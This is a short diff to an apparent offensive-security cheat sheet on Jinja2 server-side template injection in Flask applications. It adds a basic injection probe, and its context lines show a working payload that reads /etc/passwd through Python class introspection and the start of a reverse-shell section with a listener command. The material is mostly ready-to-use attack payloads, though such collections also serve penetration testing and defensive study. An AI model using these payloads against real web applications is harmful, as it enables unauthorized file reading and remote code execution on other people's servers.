@@ -6,6 +6,11 @@ Template injection allows an attacker to include template code into an existant 
 [Official website](http://jinja.pocoo.org/)
 > Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.
 
+Basic injection
+```
+{{4*4}}[[5*5]]
+```
+
 Jinja2 is used by Python Web Frameworks such as Django or Flask.
 The above injections have been tested on Flask application.
 #### Template format
@@ -37,7 +42,7 @@ The above injections have been tested on Flask application.
 #### Read remote file
 ```
 # ''.__class__.__mro__[2].__subclasses__()[40] = File class
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }} 
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
 ```
 
 #### Write into remote file
@@ -46,7 +51,7 @@ The above injections have been tested on Flask application.
 ```
 
 #### Remote Code Execution via reverse shell
-Listen for connexion 
+Listen for connexion
 ```
 nv -lnvp 8000
 ```
